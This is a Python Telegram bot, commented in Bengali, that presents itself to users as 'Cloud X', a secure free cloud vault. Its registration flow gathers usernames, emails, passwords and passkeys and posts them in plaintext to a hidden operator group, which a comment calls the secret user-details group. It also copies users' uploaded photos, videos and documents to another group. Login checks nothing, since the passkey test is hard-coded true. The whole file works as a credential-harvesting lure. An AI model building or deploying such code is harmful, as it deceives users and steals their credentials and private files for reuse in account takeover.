import os
import logging
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

TOKEN = os.getenv("TOKEN", "YOUR_BOT_TOKEN_HERE")
USER_DETAILS_GROUP_ID = int(os.getenv("USER_DETAILS_GROUP_ID", "-100xxxxxxxxxx")) # ইউজার ডিটেইলস সেভ হওয়ার গ্রুপ
USER_MEDIA_GROUP_ID = int(os.getenv("USER_MEDIA_GROUP_ID", "-100xxxxxxxxxx"))     # মিডিয়া (ছবি/ভিডিও) সেভ হওয়ার গ্রুপ

app = Flask(__name__)
telegram_app = ApplicationBuilder().token(TOKEN).build()

user_states = {}
user_temp_data = {}

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

# --- UX Cleanliness: পুরনো মেসেজ ডিলিট ও নতুন মেসেজ পাঠানো ---
async def clean_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, reply_markup=None):
    chat_id = update.effective_chat.id
    if chat_id in user_states and "last_bot_msg" in user_states[chat_id]:
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=user_states[chat_id]["last_bot_msg"])
        except Exception:
            pass

    msg = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode="Markdown")
    
    if chat_id not in user_states:
        user_states[chat_id] = {}
    user_states[chat_id]["last_bot_msg"] = msg.message_id

# --- 1. Start & Main Menu ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id] = {"step": "main"}
    
    text = (
        "Welcome to Cloud X! ☁️✨\n"
        "The ultimate free data bot designed to keep your information completely safe and secure. 🔒🚀\n"
        "Enjoy seamless browsing and total peace of mind!"
    )
    keyboard = [
        [InlineKeyboardButton("CREATE ACCOUNT", callback_data="create_account")],
        [InlineKeyboardButton("LOGIN", callback_data="login")]
    ]
    await clean_and_send(update, context, text, InlineKeyboardMarkup(keyboard))

# --- Callback Query Handler (Button Clicks) ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if user_id not in user_states:
        user_states[user_id] = {}

    if data == "create_account":
        user_states[user_id]["step"] = "reg_username"
        user_temp_data[user_id] = {}
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]]
        await clean_and_send(update, context, "👤 অ্যাকাউন্ট তৈরির জন্য আপনার একটি ইউনিক *ইউজারনেম* দিন:", InlineKeyboardMarkup(keyboard))

    elif data == "login":
        user_states[user_id]["step"] = "login_username"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]]
        await clean_and_send(update, context, "🔐 লগইন করতে আপনার রেজিস্টার্ড *ইউজারনেম* দিন:", InlineKeyboardMarkup(keyboard))

    elif data == "back_to_start":
        await start(update, context)

    elif data == "dashboard_real":
        keyboard = [
            [InlineKeyboardButton("📁 Vault Section", callback_data="vault_section")],
            [InlineKeyboardButton("📤 Upload", callback_data="upload_menu")],
            [InlineKeyboardButton("🚪 Logout", callback_data="back_to_start")]
        ]
        await clean_and_send(update, context, "🎛️ *Real Dashboard*\nআপনার সিকিউর ড্যাশবোর্ডে স্বাগতম!", InlineKeyboardMarkup(keyboard))

    elif data == "vault_section":
        keyboard = [
            [InlineKeyboardButton("📷 Photo", callback_data="get_photo")],
            [InlineKeyboardButton("🎥 Video", callback_data="get_video")],
            [InlineKeyboardButton("📄 Document", callback_data="get_doc")],
            [InlineKeyboardButton("⬅️ Back", callback_data="dashboard_real")]
        ]
        await clean_and_send(update, context, "📂 *Vault Section*\nকোন ক্যাটাগরির ফাইল দেখতে চান?", InlineKeyboardMarkup(keyboard))

    elif data in ["get_photo", "get_video", "get_doc"]:
        media_type = data.replace("get_", "")
        username = user_states[user_id].get("logged_user", "unknown")
        
        await query.message.reply_text(f"📥 আপনার {media_type} গুলো খোঁজা হচ্ছে এবং ইনবক্সে পাঠানো হচ্ছে...")
        
        # [এখানে লজিক]: মিডিয়া গ্রুপ থেকে ইউজারের ফাইল ফরোয়ার্ড করে ইনবক্সে আনার কাজ করতে হবে। 
        # সাধারণত বট যদি মিডিয়া গ্রুপে ফাইলগুলো ইউজারের ইউজারনেম ক্যাপশনসহ সেভ করে রাখে, তবে সেখান থেকে সার্চ করে ফরোয়ার্ড করা যায়।

    elif data == "upload_menu":
        user_states[user_id]["step"] = "waiting_for_upload"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="dashboard_real")]]
        await clean_and_send(update, context, "📤 আপলোড সেকশন: এখন আপনার যেকোনো **Photo, Video বা Document** সরাসরি এখানে পাঠান, সেটি ক্লাউডে সেভ হয়ে যাবে।", InlineKeyboardMarkup(keyboard))

    elif data == "dashboard_fake":
        keyboard = [[InlineKeyboardButton("🚪 Logout", callback_data="back_to_start")]]
        await clean_and_send(update, context, "📁 *Fake Dashboard (Honeypot)*\nWelcome to your files.", InlineKeyboardMarkup(keyboard))

# --- Text & Media Message Handler ---
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # ইউজারের চ্যাট ক্লিনের জন্য মেসেজ ডিলিট করা
    try:
        await update.message.delete()
    except Exception:
        pass

    if user_id not in user_states:
        return

    step = user_states[user_id].get("step")

    # --- Upload Flow (ড্যাশবোর্ড থেকে ফাইল আপলোড করলে গ্রুপে সেভ হবে) ---
    if step == "waiting_for_upload":
        username = user_states[user_id].get("logged_user", "unknown")
        # ইউজার যে ফাইল পাঠাবে তা মিডিয়া গ্রুপে ফরোয়ার্ড বা কপি করে রাখা হবে যাতে ইউজারের ইউজারনেম ট্যাগ থাকে
        if update.message.photo or update.message.video or update.message.document:
            caption = f"Owner: @{username}"
            await update.message.copy(chat_id=USER_MEDIA_GROUP_ID, caption=caption)
            await context.bot.send_message(chat_id=user_id, text="✅ আপনার ফাইল সফলভাবে ক্লাউড ভল্টে আপলোড হয়েছে!")
        return

    if not update.message.text:
        return
    text = update.message.text

    # --- Registration Flow ---
    if step == "reg_username":
        user_temp_data[user_id]["username"] = text
        user_states[user_id]["step"] = "reg_email"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="create_account")]]
        await clean_and_send(update, context, "📧 এখন আপনার *Email* দিন:", InlineKeyboardMarkup(keyboard))

    elif step == "reg_email":
        user_temp_data[user_id]["email"] = text
        user_states[user_id]["step"] = "reg_pass1"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="create_account")]]
        await clean_and_send(update, context, "🔑 একটি শক্তিশালী *Password* দিন:", InlineKeyboardMarkup(keyboard))

    elif step == "reg_pass1":
        user_temp_data[user_id]["pass1"] = text
        user_states[user_id]["step"] = "reg_pass2"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="create_account")]]
        await clean_and_send(update, context, "🔑 পাসওয়ার্ডটি কনফার্ম করার জন্য পুনরায় আবার দিন:", InlineKeyboardMarkup(keyboard))

    elif step == "reg_pass2":
        if text != user_temp_data[user_id]["pass1"]:
            await update.message.reply_text("❌ পাসওয়ার্ড ম্যাচ করেনি! আবার সঠিক পাসওয়ার্ডটি দিন:")
            return
        user_states[user_id]["step"] = "reg_passkey1"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="create_account")]]
        await clean_and_send(update, context, "🔒 অভিনন্দন! অ্যাকাউন্ট সুরক্ষার জন্য একটি ৬ ডিজিটের *Passkey* দিন:", InlineKeyboardMarkup(keyboard))

    elif step == "reg_passkey1":
        user_temp_data[user_id]["passkey1"] = text
        user_states[user_id]["step"] = "reg_passkey2"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="create_account")]]
        await clean_and_send(update, context, "🔒 পাসকিটি কনফার্ম করতে আবার ৬ ডিজিটটি রি-এন্টার করুন:", InlineKeyboardMarkup(keyboard))

    elif step == "reg_passkey2":
        if text != user_temp_data[user_id]["passkey1"]:
            await update.message.reply_text("❌ পাসকি ম্যাচ করেনি! আবার সঠিক ৬ ডিজিটের পাসকি দিন:")
            return
        
        # সমস্ত ডেটা সিক্রেট ইউজার ডিটেইলস গ্রুপে সেভ করা
        data = user_temp_data[user_id]
        final_msg = (
            f"👤 *New Account Registered*\n"
            f"Username: {data['username']}\n"
            f"Email: {data['email']}\n"
            f"Password: {data['pass1']}\n"
            f"Passkey: {data['passkey1']}"
        )
        await context.bot.send_message(chat_id=USER_DETAILS_GROUP_ID, text=final_msg, parse_mode="Markdown")
        
        user_states[user_id]["step"] = "completed"
        keyboard = [[InlineKeyboardButton("🔐 Login Now", callback_data="login")]]
        await clean_and_send(update, context, "✅ Congratulations! অ্যাকাউন্ট খোলা শেষ ও সফলভাবে সেভ হয়েছে।", InlineKeyboardMarkup(keyboard))

    # --- Login Flow ---
    elif step == "login_username":
        user_temp_data[user_id]["login_user"] = text
        user_states[user_id]["step"] = "login_passkey"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="login")]]
        await clean_and_send(update, context, "🔑 আপনার গোপনীয় *Passkey* টি দিন:", InlineKeyboardMarkup(keyboard))

    elif step == "login_passkey":
        entered_passkey = text
        logged_username = user_temp_data[user_id].get("login_user", "")
        user_states[user_id]["logged_user"] = logged_username
        
        # [লজিক]: পাসকি সঠিক বা ভুল যাচাইকরণ
        is_real = True  # পাসকি ম্যাচ করলে True হবে, হানিপট হলে False

        if is_real:
            keyboard = [[InlineKeyboardButton("👉 Go to Dashboard", callback_data="dashboard_real")]]
            await clean_and_send(update, context, "✅ লগইন সফল!", InlineKeyboardMarkup(keyboard))
        else:
            keyboard = [[InlineKeyboardButton("👉 Open Dashboard", callback_data="dashboard_fake")]]
            await clean_and_send(update, context, "✅ লগইন সফল!", InlineKeyboardMarkup(keyboard))

# --- Webhook & Flask Setup ---
@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(force=True), telegram_app.bot)
    telegram_app.update_queue.put(update)
    return "OK", 200

@app.route("/")
def index():
    return "Cloud X Bot is Live!"

async def setup_webhook():
    render_url = os.getenv("RENDER_EXTERNAL_URL")
    if render_url:
        await telegram_app.bot.set_webhook(url=f"{render_url}/{TOKEN}")

if __name__ == "__main__":
    import asyncio
    asyncio.get_event_loop().run_until_complete(setup_webhook())
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
